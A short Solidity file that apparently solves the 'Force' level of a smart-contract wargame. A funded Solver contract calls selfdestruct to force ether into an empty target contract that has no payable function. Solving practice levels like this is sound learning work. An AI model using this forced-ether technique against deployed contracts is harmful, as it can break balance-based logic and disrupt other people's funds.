// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }

contract Solver {
    address public force;

    constructor(address _forceAddress) payable {
        // Selfdestruct and send ether to the Force contract
        force = _forceAddress;
    }

    function destroyAndSend() public {
        selfdestruct(payable(force));
    }
}
